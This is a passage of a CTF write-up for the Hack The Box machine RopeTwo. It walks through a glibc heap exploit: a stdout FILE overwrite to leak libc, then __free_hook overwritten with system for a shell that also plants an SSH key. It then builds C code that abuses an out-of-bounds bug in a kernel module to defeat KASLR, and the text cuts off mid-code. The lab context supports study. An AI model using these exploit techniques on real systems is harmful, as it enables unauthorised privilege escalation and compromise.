 260   char *_IO_save_base; /* Pointer to start of non-current get area. */
 261   char *_IO_backup_base;  /* Pointer to first valid character of backup area */
 262   char *_IO_save_end; /* Pointer to end of non-current get area. */
...[snip]...
 285 #ifdef _IO_USE_OLD_IO_FILE
 286 };

```

I’m going to overwrite the `_flags`, the three `_IO_read_*` addresses, and the low byte of `_IO_write_ptr`. The `_flags` word is defined [here](http://sourceware.org/git/?p=glibc.git;a=blob;f=libio/libio.h;h=3cf1712ea98d3c253f418feb1ef881c4a44649d5;hb=HEAD#l86):

```

  92 #define _IO_MAGIC 0xFBAD0000 /* Magic number */
  93 #define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */
  94 #define _IO_MAGIC_MASK 0xFFFF0000
  95 #define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */
  96 #define _IO_UNBUFFERED 2
  97 #define _IO_NO_READS 4 /* Reading not allowed */
  98 #define _IO_NO_WRITES 8 /* Writing not allowed */
  99 #define _IO_EOF_SEEN 0x10
 100 #define _IO_ERR_SEEN 0x20
 101 #define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */
 102 #define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/
 103 #define _IO_IN_BACKUP 0x100
 104 #define _IO_LINE_BUF 0x200
 105 #define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */
 106 #define _IO_CURRENTLY_PUTTING 0x800
 107 #define _IO_IS_APPENDING 0x1000
 108 #define _IO_IS_FILEBUF 0x2000
 109 #define _IO_BAD_SEEN 0x4000
 110 #define _IO_USER_LOCK 0x8000

```

The high two bytes will be 0xfbad, the magic number for the struct. For the bottom two bytes, I’ll turn on `_IO_CURRENTLY_PUTTING` and `_IO_IS_APPENDING`. These flags are ones I’ve seen used in other CTF writeups, and make sense here to show that this data is ready to come out.

I don’t think it’s very important what I write in the three `_IO_read_*` fields, as nothing is reading out of stdout. Then I’ll want a single null byte for the low byte in `_IO_write_ptr`.

I will get one shot to write to `_IO_2_1_stdout_`, as calling `edit` will call `realloc` which will fail because it will find unexpected data where it expects heap meta. Looking carefully at `add`, it uses `fgets`, so it will [read up to the full size, or until a newline](http://www.cplusplus.com/reference/cstdio/fgets/). Since I won’t be writing the full size, the newline from `sendline` will be there. It also appends a null to the end of the input.

Putting all of that together, I’ll create this bin as follows:

```

add('stdout', 0x30, p64(0xfbad1800) + p64(0)*2 + b"\x00"*7)

```

#### Leak

To see this in action, I’ll run up to the write to `_IO_2_1_stdout_` and then attach `gdb` and set an additional break point at 0x0000555555555b92. This is after the `add` is complete, but before anything is printed (once that happens, all the pointers in the `FILE` will be updated). Now I’ll step over the leak instruction in the Python script, and `gdb` hits that break. I’ll check `_IO_2_1_stdout_`:

```

Breakpoint 2, 0x0000555555555b92 in ?? ()
(gdb) x/12xg &_IO_2_1_stdout_
0x7ffff7fc4760 <_IO_2_1_stdout_>:       0x00000000fbad1800      0x0000000000000000  <-- modified flags, null read ptr
0x7ffff7fc4770 <_IO_2_1_stdout_+16>:    0x0000000000000000      0x0a00000000000000  <-- null read end, null read base
0x7ffff7fc4780 <_IO_2_1_stdout_+32>:    0x00007ffff7fc4700      0x00007ffff7fc47e3  <-- low byte 0 for write ptr
0x7ffff7fc4790 <_IO_2_1_stdout_+48>:    0x00007ffff7fc47e3      0x00007ffff7fc47e3
0x7ffff7fc47a0 <_IO_2_1_stdout_+64>:    0x00007ffff7fc47e4      0x0000000000000000
0x7ffff7fc47b0 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000

```

When I allow this to continue (and with the Python script running with log level `DEBUG`, by adding that to the end of the invocation), I can see the data come back:

```

[DEBUG] Sent 0xb bytes:
    b'add stdout\n'
[DEBUG] Received 0x6 bytes:
    b'size: '
[DEBUG] Sent 0x3 bytes:
    b'48\n'
[DEBUG] Received 0x9 bytes:
    b'content: '
[DEBUG] Sent 0x20 bytes:
    00000000  00 18 ad fb  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 0a  │····│····│····│····│
    00000020
[DEBUG] Received 0xe5 bytes:
    00000000  00 00 00 00  00 00 00 00  70 65 fc f7  ff 7f 00 00  │····│····│pe··│····│
    00000010  ff ff ff ff  ff ff ff ff  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000020  80 37 fc f7  ff 7f 00 00  00 00 00 00  00 00 00 00  │·7··│····│····│····│
    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000050  00 00 00 00  00 00 00 00  60 55 fc f7  ff 7f 00 00  │····│····│`U··│····│
    00000060  00 18 ad fb  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 0a  │····│····│····│····│
    00000080  00 47 fc f7  ff 7f 00 00  e3 47 fc f7  ff 7f 00 00  │·G··│····│·G··│····│
    00000090  e3 47 fc f7  ff 7f 00 00  e3 47 fc f7  ff 7f 00 00  │·G··│····│·G··│····│
    000000a0  e4 47 fc f7  ff 7f 00 00  00 00 00 00  00 00 00 00  │·G··│····│····│····│
    000000b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    000000c0  00 00 00 00  00 00 00 00  00 3a fc f7  ff 7f 00 00  │····│····│·:··│····│
    000000d0  01 00 00 00  00 00 00 00  ff ff ff ff  ff ff ff ff  │····│····│····│····│
    000000e0  00 00 00 24  20                                     │···$│ │
    000000e5

```

It matches what I saw earlier and expected. I can pull a libc address from bytes 8-15.

When I first solved this, I didn’t have `add` returning anything, but I updated it to return whatever comes back, so I could catch it and get the libc address from it.

I’ll look at this address and the `/proc/$(pidof rshell)/maps` file to see that the offset from it to the base of libc is 0x1e7570.

#### Updating for ASLR

I mentioned earlier that there are some issues here with ASLR. I’m modifying the bottom two bytes (or four nibbles). But I only know what I want the low three nibbles to be. Therefore, I’m guessing at the forth. There are 24 = 16 possible values there, so a one in sixteen chance of being correct, 6.25%. Still, I can run the attack over and over, and so in ten tries I’ll succeed 50% of the time, and in twenty tries 75% of the time. I’ll update the script to loop over failures.

### Execution

#### Writing to \_\_free\_hook

Now that I have leaked libc, I can go for execution. I’m going to overwrite `__free_hook` with `system` and then free a chunk which contains “/bin/sh”.

The first challenge I ran into is that I can’t free the “file” that’s pointing at `_IO_2_1_stdout_`, as it will cause a crash. That means from here on out, I can only work with one file. The first example I gave on how to create a fake chunk was actually prepping for this. When I originally got to this point, I had to go back and add that at the start so that it was ready to fetch from here (and that meant re-working all the spacing, etc). Once I did that, I reached this point with the following status:

```
-----------------------------------
[0x00007ffff7fc4760] stdout  : 
[0x0000000000000000]         : (null)
-----------------------------------
0x55555555c280: 0x0000000000000000      0x0000000000000061  <-- fake1 from start, in 0x60 tcache
0x55555555c290: 0x0000000000000000      0x000055555555c010
0x55555555c2a0: 0x0000000000000000      0x0000000000000051  <-- real chunk B from start, in 0x50 tcache
0x55555555c2b0: 0x0000000000000000      0x000055555555c010
0x55555555c2c0: 0x0000000000000000      0x0000000000000000
0x55555555c2d0: 0x0000000000000000      0x0000000000000021
0x55555555c2e0: 0x0000000000000000      0x000055555555c010
0x55555555c2f0: 0x0000000000000000      0x0000000000000041
0x55555555c300: 0x0000000000000000      0x000055555555c010
0x55555555c310: 0x0000000000000000      0x0000000000000000
0x55555555c320: 0x0000000000000000      0x0000000000000000
0x55555555c330: 0x0000000000000000      0x0000000000000071
-----------------------------------
                  top: 0x55555555c490 (size : 0x20b70) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x55555555c3d0 (doubly linked list corruption 0x55555555c3d0 != 0x0 and 0x55555555c3d0 is broken)
(0x20)   tcache_entry[0](5): 0x55555555c460 --> 0x55555555c3e0 --> 0x55555555c460 (overlap chunk with 0x55555555c450(freed) )
(0x30)   tcache_entry[1](3): 0x55555555c430 --> 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )
(0x40)   tcache_entry[2](255): 0xfbad2887 (invalid memory)
(0x50)   tcache_entry[3](1): 0x55555555c2b0                                             <-- B
(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2a0(freed) ) <-- fake1
(0x80)   tcache_entry[6](2): 0x55555555c400 (overlap chunk with 0x55555555c450(freed) )
(0xa0)   tcache_entry[8](7): 0x55555555c3e0 (overlap chunk with 0x55555555c3d0(freed) )

```

So I can get chunk fake1, and use it to modify chunk B which is currently in the 0x50 tcache. If I replace the first word which is currently null (indicating the end of the linked list) with a pointer, that pointer effectively joins the tcache list.

```

add('K', 0x50, p64(0)*3 + p64(0x51) + p64(libc.symbols['__free_hook']-8)) # add free hook to tcache 0x50
rm('K')               # free file

```

After running those, the pointer is added:

```

0x55555555c280: 0x0000000000000000      0x0000000000000061
0x55555555c290: 0x0000000000000000      0x000055555555c010
0x55555555c2a0: 0x0000000000000000      0x0000000000000051
0x55555555c2b0: 0x00007ffff7fc65a0      0x000055555555000a  <-- free_hook in tcache
0x55555555c2c0: 0x0000000000000000      0x0000000000000000

```

And it shows in `heapinfo`:

```

(0x50)   tcache_entry[3](1): 0x55555555c2b0 --> 0x7ffff7fc65a0

```

I need to get rid of the 2b0 chunk:

```

# clear from tcache with add, shrink, rm
add('J', 0x40)
edit('J', 0x10)
rm('J')

```

Now I just `add` a 0x40 byte entry, and then free it.

```

add('hook', 0x40, b"/bin/sh\x00" + p64(libc.symbols['system']))
rm('hook', wait=False)
p.interactive()

```

#### \_\_free\_hook Payload

The payload was a bit tricky to come up with as well. Once I write to `__free_hook`, I can’t free that either without a crash, so effectively both my files are used. To get around this, I’ll point this chunk to eight bytes before `__free_hook`. I’ll overwrite those bytes with “/bin/sh\x00” and then continue with the `system` address. That way, when the program goes to read the chunk contents (or passes it to `_free_hook`), it gets the string “/bin/sh”.

### Shell

The final script is [here](/files/ropetwo-pwn-rshell.py). Because the shell from PwnTools isn’t great, I added a line for the remote target to automatically write an `authorized_keys` files so I could go right to SSH.

Running it returns a shell:

```

root@kali# python3 pwn_rshell.py REMOTE
[*] '/media/sf_CTFs/hackthebox/ropetwo-10.10.10.196/rshell'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/media/sf_CTFs/hackthebox/ropetwo-10.10.10.196/libc.so.6-ropetwo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Connecting to 10.10.10.196 on port 22: Done
[ERROR] python is not installed on the remote system '10.10.10.196'
[*] chromeuser@10.10.10.196:
    Distro    Unknown Unknown
    OS:       Unknown
    Arch:     Unknown
    Version:  0.0.0
    ASLR:     Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[+] Opening new channel: 'rshell': Done
[-] Failed
[+] Opening new channel: 'rshell': Done
[-] Failed
[+] Opening new channel: 'rshell': Done
[-] Failed
[+] Opening new channel: 'rshell': Done
[-] Failed
[+] Opening new channel: 'rshell': Done
[-] Failed
[+] Opening new channel: 'rshell': Done
[-] Failed
[+] Opening new channel: 'rshell': Done
[-] Failed
[+] Opening new channel: 'rshell': Done
[-] Failed
[+] Opening new channel: 'rshell': Done
[+] Leaked address: 0x7f7c44cb6570
[+] Libc base: 0x7f7c44acf000
[*] Overwriting __free_hook
[*] Triggering shell
[+] Wrote SSH key to /home/r4j/.ssh/authorized_keys
[*] Switching to interactive mode
$ $ $ $ id
uid=1000(r4j) gid=1001(chromeuser) groups=1001(chromeuser)

```

SSH works as well:

```

root@kali# ssh -i ~/keys/ed25519_gen r4j@10.10.10.196
Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-38-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 4.0

454 updates can be installed immediately.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

Last login: Tue Nov 24 17:34:39 2020 from 10.10.14.14
r4j@rope2:~$

```

And grab `user.txt`:

```

r4j@rope2:~$ cat user.txt
31df91d9************************

```

## Priv: r4j –> root

### Enumeration

When I was looking for a method to escalate from chromeuser to r4j, I ran a find query to look for files owned by r4j. While above I showed the search for files owned by this user, the search for files owned by the r4j group also returns something interesting:

```

r4j@rope2:/dev$ find / -type f -group r4j -ls 2>/dev/null | grep -v -e " \/proc" -e " \/sys"
  1054414      8 -rw-r-----   1 root     r4j          5856 Jun  1 14:58 /usr/lib/modules/5.0.0-38-generic/kernel/drivers/ralloc/ralloc.ko
  1056436     16 -rwsr-xr-x   1 r4j      r4j         14312 Feb 24  2020 /usr/bin/rshell
  1054405      4 -rwx------   1 r4j      r4j          3771 Apr  4  2019 /home/r4j/.bashrc
  1056441      4 -rw-r-----   1 root     r4j            33 Nov 23 16:20 /home/r4j/user.txt
  1054406      4 -rwx------   1 r4j      r4j           807 Apr  4  2019 /home/r4j/.profile
  1054407      4 -rwx------   1 r4j      r4j           220 Apr  4  2019 /home/r4j/.bash_logout
  1054423      0 -rw-r--r--   1 r4j      r4j             0 Feb 23  2020 /home/r4j/.cache/motd.legal-displayed

```

`ralloc.ko` is a kernel module. There’s a matching device in `/dev`:

```

r4j@rope2:/dev$ ls -l ralloc 
crw-r--r-- 1 root root 10, 52 Nov 25 13:40 ralloc

```

I’ll use `scp` to get a copy of the module:

```

root@kali# scp -i ~/keys/ed25519_gen r4j@10.10.10.196:/usr/lib/modules/5.0.0-38-generic/kernel/drivers/ralloc/ralloc.ko .
ralloc.ko                                       100% 5856   129.3KB/s   00:00

```

I’ll also want some additional information about RopeTwo so I can replicate the environment. The OS and kernel versions:

```

r4j@rope2:~$ cat /etc/lsb-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=19.04
DISTRIB_CODENAME=disco
DISTRIB_DESCRIPTION="Ubuntu 19.04"

r4j@rope2:~$ uname -a
Linux rope2 5.0.0-38-generic #41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

```

To see the protections the kernel is running, I’ll look in `/proc/cpuinfo`. For each processor, I see the flag `smep`, which stands for [Supervisor Mode Execution Protection](https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention). This means that I won’t be able to run user-space code in the kernel. Instead, I’ll need to use ROP to achieve my goals during exploitation.

### Local Configuration

#### Strategy

Because kernel modules are kernel specific, I’m going to want to create the same environment in a local VM. With access to a Linux host machine, the easiest way to do this is with QEMU. [This blog](https://www.nullbyte.cat/post/linux-kernel-exploit-development-environment/#environment-setup) gives extensive detail on that process. Unfortunately for me, I was traveling for two weeks with only a Windows laptop while solving this challenge. I typically run VirtualBox for VMs, as I like free solutions, and it’s way more powerful than VMWare’s free option, Player. That said, here, the free VMWare Player has some features that are nice for kernel debugging, so I’ll use that.

#### Build VM

I downloaded the [iso for Ubuntu 19.04](http://old-releases.ubuntu.com/releases/disco/), grabbing the non-live iso, and built a new VM. I left it in NAT mode, but added [port forwarding](https://hitchhikingtheweb.wordpress.com/2014/09/02/portforwarding-with-vmware-player-and-nat/) so I could SSH into it.

The VM was already running the same kernel:

```

oxdf@ropetest:~$ uname -a
Linux ropetest 5.0.0-38-generic #41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

```

Had it not been, this one is available through `apt`, so I could install with `sudo apt install linux-image-5.0.0-38-generic`.

I’ll also need the debugging symbols package, which I grabbed from [here](https://answers.launchpad.net/ubuntu/disco/amd64/linux-image-unsigned-5.0.0-38-generic-dbgsym/5.0.0-38.41), and installed (it took a while):

```

oxdf@ropetest:~$ sudo dpkg -i linux-image-unsigned-5.0.0-38-generic-dbgsym_5.0.0-38.41_amd64.ddeb
(Reading database ... 108751 files and directories currently installed.)
Preparing to unpack linux-image-unsigned-5.0.0-38-generic-dbgsym_5.0.0-38.41_amd64.ddeb ...
Unpacking linux-image-unsigned-5.0.0-38-generic-dbgsym (5.0.0-38.41) over (5.0.0-38.41) ...
Setting up linux-image-unsigned-5.0.0-38-generic-dbgsym (5.0.0-38.41) ...

```

The last thing I’ll do is go into the `.vmx` file for the this VM and add:

```

debugStub.listen.guest64 = "TRUE"

```

That will start a listener on my host machine on 127.0.0.1:8864 that I can connect `gdb` to. If I need to connect from another host, I can add a second line:

```

debugStub.listen.guest64.remote = "TRUE"

```

If that line is present, the listener will be on 0.0.0.0:8864.

If for some reason I wanted to change the port, I should be able to do that with (but I’ll just use the default port):

```

debugStub.port.guest64 = "8865"

```

#### Install ralloc

I’ll copy the module into the VM, either by SSH or using VMWare Tools to share a folder into the VM.

To load the module, I can simply use `insmod` (insert module):

```

oxdf@ropetest:~$ sudo insmod ./ralloc.ko

```

Now it shows up in `lsmod` (list modules), and the device is created:

```

oxdf@ropetest:~$ lsmod | grep ralloc
ralloc                 16384  0
oxdf@ropetest:~$ ls /dev/ralloc
/dev/ralloc

```

I can find the address in memory for it by grepping in `/proc/modules`:

```

oxdf@ropetest:~$ sudo cat /proc/modules | grep ralloc
ralloc 16384 0 - Live 0xffffffffc0768000 (OE)

```

#### gdb

I’ll drop into a wsl `bash` shell from PowerShell:

```

PS C:\Users\0xdf> bash
df@LAPTOP-3RO4FE29:/mnt/c/Users/0xdf$

```

I’ll install [GEF](https://github.com/hugsy/gef) in this environment (I had tried [Peda](https://github.com/longld/peda), but it didn’t place nicely with kernel debugging) following the instructions on the page.

When I run `gdb`, I’ll need to point it at the kernel I’m debugging. Because I’ve installed the debug symbols, I can get the kernel out of `/usr/lib/debug/boot`:

```

PS > scp -P 8889 oxdf@localhost:/usr/lib/debug/boot/vmlinux-5.0.0-38-generic .
oxdf@localhost's password:
vmlinux-5.0.0-38-generic           100%  680MB  25.8MB/s   00:26

```

Now I’ll start `gdb` on that kernel file, and set the target to remote:

```

df@LAPTOP-3RO4FE29:/mnt/c/Users/0xdf/Dropbox/CTFs/hackthebox/ropetwo-10.10.10.196$ gdb -q ./vmlinux-5.0.0-38-generic
GEF for linux ready, type `gef' to start, `gef config' to configure
74 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 6 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./vmlinux-5.0.0-38-generic...done.
gef➤  target remote :8864
Remote debugging using :8864

```

Now I’ll add the ralloc file to my local `gdb` instance as well. This gives `gdb` the ability to set break points

```

gef➤  add-symbol-file ralloc.ko 0xffffffffc0768000
add symbol table from file "ralloc.ko" at
        .text_addr = 0xffffffffc0768000
Reading symbols from ralloc.ko...(no debugging symbols found)...done.

```

### Static Analysis

#### General Structure

I need to figure out what this module does, so I’ll open `ralloc.ko` in Ghidra. The module exports two functions, `rope2_init` and `rope2_exit`:

![image-20201128154200415](https://0xdfimages.gitlab.io/img/image-20201128154200415.png)

They are both super simple, with `rope2_init` calling `misc_register` and `rope2_exit` calling `misc_deregister` to create and remove the device. There are a handful more functions, but only one is really interesting, `rope2_ioctl`.

#### IOCTL

#### Structs

This code has two `struct` that are used to manage data, so I spent a minute reading through the code to see how the structures were used, and then created them in Ghidra. The first I called `ralloc_in`, which is used to manage the data passed with `ioctl` is called:

![image-20201128160127681](https://0xdfimages.gitlab.io/img/image-20201128160127681.png)

The other I named `ralloc_array`. This is used for a global variable I named `buffers` that can hold up to 32 (0x20) buffers. Each object stores a size and an address for the buffer:

![image-20201128160838808](https://0xdfimages.gitlab.io/img/image-20201128160838808.png)

#### rope2\_ioctl

Once I apply those to the variables in the code, it comes out pretty clean.

```

long rope2_ioctl(undefined8 fd,int ioctl_num,long input_struct)

{
  long _canary;
  void *__dest;
  void *__src;
  long addr;
  long user_input_;
  ulong id;
  long return;
  long in_GS_OFFSET;
  ralloc_in user_input;
  
  __fentry__();
  _canary = *(long *)(in_GS_OFFSET + 0x28);
  mutex_lock(lock);
  _copy_from_user(&user_input,user_input_,0x18);
                    /* ADD */
  if (ioctl_num == 0x1000) {
    id = (ulong)(uint)user_input.id;
    if ((user_input.size < 0x401) && ((uint)user_input.id < 0x20)) {
      if (buffers[id].address == 0) {
        addr = __kmalloc(user_input.size,0x6000c0);
        buffers[id].address = addr;
        if (addr != 0) {
          buffers[id].size = user_input.size + 0x20;
          return = 0;
        }
      }
    }
  }
  else {
                    /* Delete */
    if (ioctl_num == 0x1001) {
      if (((uint)user_input.id < 0x20) && (buffers[(uint)user_input.id].address != 0)) {
        kfree();
        buffers[(uint)user_input.id].address = 0;
        return = 0;
      }
    }
    else {
                    /* Write */
      if (ioctl_num == 0x1002) {
        if ((uint)user_input.id < 0x20) {
          if (((void *)buffers[(uint)user_input.id].address != (void *)0x0) &&
             (__dest = (void *)buffers[(uint)user_input.id].address, __src = user_input.data,
             (user_input.size & 0xffffffff) < buffers[(uint)user_input.id].size ||
             (user_input.size & 0xffffffff) == buffers[(uint)user_input.id].size))
          goto joined_r0x001001ec;
        }
      }
      else {
                    /* Read */
        if ((ioctl_num == 0x1003) && ((uint)user_input.id < 0x20)) {
          __src = (void *)buffers[(uint)user_input.id].address;
          if ((__src != (void *)0x0) &&
             (__dest = user_input.data,
             (user_input.size & 0xffffffff) <= buffers[(uint)user_input.id].size)) {
          }
        }
      }
      if (((ulong)user_input.data & 0xffff000000000000) == 0) {
        memcpy(__dest,__src,user_input.size & 0xffffffff);
        return = 0;
      } else {
        return = -1;
      }
    }
  }
  mutex_unlock(lock);
  if (_canary == *(long *)(in_GS_OFFSET + 0x28)) {
    return return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

```

Basically there’s a switch statement on four potential input codes to do add (0x1000), delete (0x1001), write (0x1002), and read (0x1003).

The vulnerability is in how new blocks are added. There’s a check to ensure that the block isn’t bigger than 0x400, and that the id is less than 32, and then the size is saved into the list of buffers 0x20 bytes larger than the buffer is. This allows me to read and write outside the end of the buffer.

### Basic Interaction

I started by writing a c program that will interact with the device, to include some helper functions to make each of the IOCTL calls:

```

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>

int fd;

struct user_data_struct {
    uint64_t id;
    uint64_t size;
    void* data;
} user_data;

long create_buf(uint64_t id, uint64_t size){
    user_data.id = id;
    user_data.size = size;
    return ioctl(fd, 0x1000, &user_data);
}

long delete_buf(uint64_t id) {
    user_data.id = id;
    return ioctl(fd, 0x1001, &user_data);
}

long write_buf(uint64_t id, uint64_t size, void *data){
    user_data.id = id;
    user_data.size = size;
    user_data.data = data;
    return ioctl(fd, 0x1002, &user_data);
}

long read_buf(uint64_t id, uint64_t size, void *data){
    user_data.id = id;
    user_data.size = size;
    user_data.data = data;
    return ioctl(fd, 0x1003, &user_data);
}

```

Now I’ll start with a simple `main` that opens the device, clears out the buffers, creates one, writes 0x40 bytes of As to it, and then reads 0x420 bytes back out of it:

```

int main(int argc) {
    fd = open("/dev/ralloc", O_RDONLY);
    if(fd == -1) {
        fprintf(stderr, "Failed to open /dev/ralloc");
        return -1;
    }

    for(int i=0; i < 0x20; i++){
        delete_buf(i);
    }

    create_buf(1, 0x400);

    uint64_t *input = malloc(0x400);
    memset(input, 0x41, 0x40);
    write_buf(1, 0x40, input);

    uint64_t *output = malloc(0x420);
    read_buf(1, 0x420, output);

    for(int i=0; i < 0x420/8; i++){
        if (i % 4 == 0) {
            printf("\n%03x: ", i*8);
        }
        printf("%016lx ", output[i]);
    }
    printf("\n");

```

When I run this, I get results that match what I expect:

```

oxdf@ropetest:~$ ./exploit

000: 4141414141414141 4141414141414141 4141414141414141 4141414141414141 <-- 0x40 bytes of A
020: 4141414141414141 4141414141414141 4141414141414141 4141414141414141 
040: 6c732f6c656e7265 61686769732f6261 65686361635f646e 2f70756f7267632f <-- random stuff in 0x400 byte buffer
060: 5f646e6168676973 3039286568636163 6f69737365733a35 732e343939312d6e 
080: 5553002965706f63 3d4d455453595342 530070756f726763 39383d4d554e5145 
0a0: 5f43455355003632 494c414954494e49 313631313d44455a 3339353439323531 
0c0: ffff9880f48c0000 dead000000000100 dead000000000200 dead000000000100 
0e0: dead000000000200 dead000000000100 dead000000000200 dead000000000100 
100: dead000000000200 dead000000000100 dead000000000200 dead000000000100 
120: dead000000000200 dead000000000100 dead000000000200 dead000000000100 
140: dead000000000200 dead000000000100 dead000000000200 dead000000000100 
160: dead000000000200 dead000000000100 dead000000000200 dead000000000100 
180: dead000000000200 dead000000000100 dead000000000200 ffff9880f48c7598 
1a0: ffff9880f48c7598 0000000000000000 0000000000000000 0000000000000000 
1c0: 0000000000000000 ffff9880f48c75c8 ffff9880f48c75c8 ffff9880f48c75d8 
1e0: ffff9880f48c75d8 ffff9880f48c75e8 ffff9880f48c75e8 0000000000000000 
200: 0000000000000000 0000000000000000 0000000000000000 ffff987fa5bf3800 
220: 0000000000000218 0000000000000000 0000000000000000 0000000000000000 
240: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
260: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
280: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
2a0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
2c0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
2e0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
300: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
320: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
340: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
360: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
380: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
3a0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
3c0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
3e0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 
400: ffffffff960c4f20 ffffffff9655c3c0 ffffffff96067120 ffffffff96711080 <-- reading into next buffer

```

### KASLR Defeat

#### Strategy

A common technique for kernel heap exploitation is to find a `tty_struct`. I can use it later to get execution, but first I’ll use it to leak an addresses a constant offset from the kernel base. I’ll create this using `/dev/ptmx`, which is [a pseudoterminal device](https://linux.die.net/man/4/ptmx). There are many writeups that show good examples of exploiting this, such as [this](https://changochen.github.io/2018-02-07-sharif8.html) and [this](https://hackmd.io/@ptr-yudai/rJp1TpbBU).

The idea is that I will create a new buffer, and then immediately open `/dev/ptmx`, which will allocate a kernel buffer of 0x2e0 bytes for the `tty_struct`, hopefully immediately after my buffer. Because I can read 0x20 bytes beyond the end of my buffer, hopefully I’ll be able to read into the struct, which has the following format:

```

struct tty_struct {
	int	magic;
	struct kref kref;
	struct device *dev;
	struct tty_driver *driver;
	const struct tty_operations *ops;
	/* ...... */
}

```

The goal is to read the `tty_operations` pointer, as it points to `ptm_unix98_ops`, which has a constant offset from the kernel base. My first attempt was to use the fact the `TTY_MAGIC` is [defined as](https://docs.huihoo.com/doxygen/linux/kernel/3.7/include_2linux_2tty_8h_source.html) 0x5401 to check and see if I managed to read the right struct. However, there are multiple `tty_structs` in memory, and it finds others that don’t point to `ptm_unix98_ops` when I look in the debugger.

I can look in `gdb` and see the current address of `ptm_unix98_ops`:

```

gef➤  p &ptm_unix98_ops
$1 = (const struct tty_operations *) 0xffffffff820af6a0 <ptm_unix98_ops>

```

While the top of the address will change with KASLR, the bottom three nibbles won’t. So I’ll look for both the magic and the last three bytes where I’d expect `tty_operations`.

To find the offset from `ptm_unix98_ops` to the kernel base, I’ll look in `/proc/kall

```

root@ropetest:~# cat /proc/kallsyms | grep ' startup_64'
ffffffff94a00000 T startup_64

```

So the offset is:

```

gef➤  p 0xffffffff95aaf6a0 - 0xffffffff94a00000
$1 = 0x10af6a0

```

#### Implementation

The following code will clear all the buffer slots. Then it will try up to 32 times to allocate a buffer, and then immediately open `/dev/ptmx`. Then it will do the out of bounds read, looking for the magic and the right low three bytes for `tty_operations`. On finding finding it, it will break and print:

```

int main(int argc) {
    int i;
    fd = open("/dev/ralloc", O_RDONLY);
    if(fd == -1) {
        fprintf(stderr, "Failed to open /dev/ralloc");
        return -1;
    }

    for(i=0; i < 0x20; i++){
        delete_buf(i);
    }

    uint64_t *output = malloc(0x420);
    for(i=0; i < 0x20; i++){
        create_buf(i, 0x400);
        int ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);

        read_buf(1, 0x420, output);
        if((output[0x400/8] & 0xffffffff) == 0x5401 &&
           (output[0x418/8] & 0xfff) == 0x6a0) {
            break;
        }
        printf("[-]Failed to find tty_struct, retrying [%02x]\n", i);
    }

    if (i == 0x20){
        printf("Failed to find tty_struct. Try again\n");
        exit(-1);
    }
    for(i=0x400/8; i < 0x420/8; i++){
        printf("0x%03x: %016lx\n", i*8, output[i]);
    }
}

```

Sometimes it doesn’t find anything, but many times it does:

```

r4j@rope2:~$ /tmp/n
[-]Failed to find tty_struct, retrying [00]
[-]Failed to find tty_struct, retrying [01]
[-]Failed to find tty_struct, retrying [02]
0x400: 0000000100005401 <-- magic
0x408: 0000000000000000
0x410: ffff9880ead25600
0x418: ffffffff95aaf6a0 <-- tty_operations

```

I refactored that into a loop now so that it will keep trying if it gets to 32 and still hasn’t found it:

```

int main(int argc) {

    int i, id;
    uint64_t *output = malloc(0x420);
    uint64_t kernel_base;

    fd = open("/dev/ralloc", O_RDONLY);
    if(fd == -1) {
        fprintf(stderr, "Failed to open /dev/ralloc");
        return -1;
    }

    kernel_base = 0;
    while(kernel_base == 0) {
        // Clear buffers
        for(i=0; i < 0x20; i++){
            delete_buf(i);
        }

